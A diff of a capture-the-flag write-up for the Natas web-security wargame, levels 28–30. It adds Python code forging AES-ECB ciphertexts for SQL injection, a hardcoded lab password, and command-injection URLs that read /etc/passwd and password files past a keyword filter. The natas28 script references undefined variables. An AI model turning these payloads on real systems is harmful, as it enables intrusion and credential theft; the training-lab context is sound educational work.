@@ -9,7 +9,7 @@ excerpt: My followup writeup to challenges that I solved in Natas Wargames
 
 ## Overview
 
-These set of challenges on the Wargames are focussed on Web Application Security Testing and Scanning. Each machine stores the credentials for the next machine. **All passwords are also stored in /etc/natas_webpass/**. In this article, I cover the solutions from 16-34.
+These set of challenges on the Wargames are focussed on Web Application Security Testing and Scanning. Each machine stores the credentials for the next machine. **All passwords are also stored in /etc/natas_webpass/**. In this article, I cover the solutions from 16-30. The next 4 challenges would be posted shortly.
 
 These are followup to the challenges post which I put out earlier for the challenges 1-15.
 
@@ -384,7 +384,9 @@ Next we login as natas28, and password is x. This displays the credentials for t
 
 __"Even AES is insecure in ECB mode"__
 
-I feel that this was the hardest challenge so far. Here, we see we can query using an input, but there is no option to view the source code. When we query something , the query is displayed in the URL header. Let us dive further into that. If some of you have worked on cryptopal challenges before, this is familiar territory. 
+I feel that this was the hardest challenge so far requiring knowledge of cryptography, and good grasp of programming. It took me several days to come up with a solution for this one.
+
+Here, we see we can query using an input, but there is no option to view the source code. When we query something , the query is displayed in the URL header. Let us dive further into that. If some of you have worked on cryptopal challenges before, this is familiar territory. 
 
 See the query from URL header (after URL decode): (I supplied 'a')
 
@@ -401,15 +403,126 @@ G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypV
 
 The above might be displayed differently, but it is garbage to the untrained eye. 
 
-So, what is our target here. SQL injection. But, we cannot inject from the input field- All characters are being escaped there. So we have to inject the query parameter in the URL header, to do that we need to encrypt our payload in the right way, so it decrypts to our payload. This challenge would require us to understand and break the encryption scheme, and figure out the credentials for the next level.
+So, what is our target here. SQL injection. But, we cannot inject from the input field- All characters are being escaped there. So we have to inject the query parameter in the URL header, to do that we need to encrypt our payload in the right way, so it decrypts to our payload. if you notice carefully, there is no escaping being done after encryption, thus, the input sanitation is being done **before the encryption.** What this means is that, though we cannot submit an injection as a plaintext query, we can theoretically do so, if we can obtain the encrypted version of the unsanitized plaintext query. Let’s try to find a way to get that. This challenge would require us to understand and break the encryption scheme, and figure out the credentials for the next level.
 
 **Step 1** : What is our target? To get the credentials for natas29 by querying the database. SQL injection, so noting down the SQL query which we would need to encrypt.
 
 ```sql
-SELECT joke from joketable where text LIKE ‘%user_input%’;
+SELECT * FROM <table name> where <column name> LIKE '%<query>%' UNION ALL SELECT * from users;
 ```
 
-**Step 2**: Break the encryption scheme. If you try out several different inputs you will notice a pattern. The prefix of the encrypted param does not change as your input gets longer. **The first 32 bytes are always the same.** This means that some text is consistently getting prepended to our text. As well, changing the first character of your input does not change the end of the encrypted text.
+**Step 2**: Understand the encryption scheme. If you try out several different inputs you will notice a pattern. The prefix of the encrypted param does not change as your input gets longer. **The first 16 bytes are always the same.** This means that some text is consistently getting prepended to our text. As well, changing the first character of your input does not change the end of the encrypted text. The suffix is also same, which means some sort of padding mechanism is in place.
+
+The padding mechanism is revealed when you submit an invalid character to the "query" parameter such as single-quote. The padding mechanism is **PKCS7**. Without knowledge of encryption algorithm, let us assume it is AES. Can we break **AES-ECB?**
+
+**Step3:** Break AES ECB. ECB is not a chaining mode, which means every block is encrypted with the same key . Hence each block of plaintext generates the same ciphertext. The next question we should be trying to answer is __What is the block size ?__.  The block size can be figured out by a brute force approach.  We will start at a guess of block size of x and if our guess is right both blocks should have the same encrypted output. Note that all queries have a fixed prefix (SELECT statement syntax).
+
+**The other thing is we do not need to ourselves generate the entire encrypted query, the oracle will do it for us. We need to generate only for the characters being sanitised or escaped.** Some test code for figuring out the block encryption scheme
+
+```python
+import requests
+import binascii
+import urllib
+import base64
+import string
+
+charset = string.ascii_lowercase
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+s = requests.Session()
+s.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')
+
+sample = "XXXXXXXXX" # 9 char long
+
+for x in charset:
+    data = {'query':sample+x}
+    r = s.post(url, data=data)
+    cipher = r.url.split('=')[1]
+    cipher = urllib.parse.unquote(cipher)
+    print("[*] last char. = %s | %s" % (x, cipher))
+```
+
+
+
+Conclusion: It is an **ECB** cipher based on **16 bytes block size**. Those assumptions are based on 2 facts 
+
+- The prefix of the string is always the same so, each block is encrypted independently with the same key.
+- The only changing part is 16 bytes long.
+
+You should note that :
+
+- The block 1 & 2 don’t seem to change (SQL Syntax)
+- The block 3 seems to change, probably due to the changing characters (this is the area where the query parameter is present)
+- The blocks further 4 ,5 don’t seem to change either (SQL Syntax)
+
+The above behaviour has an outlier, that happens when dealing with punctuation symbols. Clearly they are being sanitized or escaped causing the deviant behaviour.
+
+Finally, to bypass the input sanitization, we could send the following query :
+
+- Block 1 = “XXXXXXXXXX’” (10 chars, last one is a single quote)
+- Block 2 = “SQL Injection” (10 chars)
+- Block x = “remainder sqli  payload” (10 chars)
+
+And the returned query should contain :
+
+- Block 1 = “XXXXXXXXX\” (10 chars)
+- Block 2 = “‘SQL Injection” (note the **‘** at the beginning)
+- Block x = “remaining sqli payload…”
+
+Let’s recap :
+
+- We will generate a baseline by sending a query with **10** spaces
+- We will send the SQLi prepended by **9** spaces and a **quote*
+- We will compute the number of blocks containing our SQLi
+- Then we forge a ciphertext using our baseline (empty string), the SQLi and the footer of the baseline
+
+The code to do the above has been shown below
+
+```python
+import requests
+import urllib
+import base64
+
+conn_url = "http://natas28.natas.labs.overthewire.org"
+conn = requests.Session()
+#basic auth
+conn.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')
+
+# First we generate a baseline for the header/footer
+data = {'query':10 * ' '}
+resp = conn.post(url, data=data)
+meat = urllib.parse.unquote(resp.url.split('=')[1])
+meat = base64.b64decode(meat.encode('utf-8'))
+header = baseline[:48]
+#Manually analyze response to extract the information we need out of the HTML response
+footer = baseline[48:]
+
+sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
+data = {'query':sqli}
+resp = s.post(url, data=data)
+exploit = urllib.parse.unquote(r.url.split('=')[1])
+exploit = base64.b64decode(exploit.encode('utf-8'))
+
+#Calculating the size of the payload
+nblocks = len(sqli) - 10
+while nblocks % 16 != 0:
+    nblocks += 1 
+nblocks = int(nblocks / 16)
+
+
+final = header + exploit[48:(48 + 16 * nblocks)] + footer
+final_ciphertext = base64.b64encode(final)
+search_url = "http://natas28.natas.labs.overthewire.org/search.php"
+resp = s.get(search_url, params={"query":final_ciphertext})
+
+print(resp.text)
+```
+
+
+
+
+
+
 
 
 
@@ -420,3 +533,65 @@ SELECT joke from joketable where text LIKE ‘%user_input%’;
 
 
 ### Natas 29
+
+
+
+This one is a somewhat tricky challenge. I have zero knowledge of PERL, so I tried to learn the basics of it as I moved along. There is a drop down text that shows perl code and a rant about perl language, and for some odd reason right clicking is disabled. We can just add the view-source before url's to see the source code anyways.
+
+They have some weird rants, which I wish had the time to read and make sense of
+
+
+![weird rant]({{site.url}}/public/natas29_1.PNG)
+
+So based on the dropdown selected, some text pops up on the page. What catches our attention here is the URL, LFI much?
+
+```html
+http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground
+```
+
+
+
+We immediately think of trying to include the file of our choice which is ofcourse the password file for the user natas30.  All my attempts to include any file remotely or locally failed. 
+
+It seems that the perl script is using this filename as an argument and then populating the UI. So could we try escaping and performing command injection? 
+
+Initial attempts failed, but when I tried null terminating the URL with %00. %0a works too, but not %0d. This shows the list of files in the current directory.
+
+```php+HTML
+http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
+```
+
+The following works as well, which means the '/' is not being escaped or filtered
+
+```html
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/passwd%0a
+```
+
+Let us try to fetch natas30's password. First I tried an ls.
+
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%20/etc/natas_webpass%0a
+```
+
+This fails, and "meeeep" is printed- It is filtering on the word natas and blocking it. Let us use encoding here and try to beat this filter. To do this we add url encoded version of single quotes to beat this filter which are going to be filtered out, but will help us beat the check for the word "natas". It works.
+
+```html
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/na%22t%22as_webpass/na%22ta%22s30%0a
+```
+
+
+
+
+
+
+
+### Natas 30
+
+Another PERL based challenge. It is a webform with username and password, and we have to login. Looking at the source code we see that they are using "prepare" for performing SQL queries, hence that should be pretty tight against any SQL injection attempts. So we have to exploit some other flaw in the application. Now we know
+
+
+
+
+
+
+
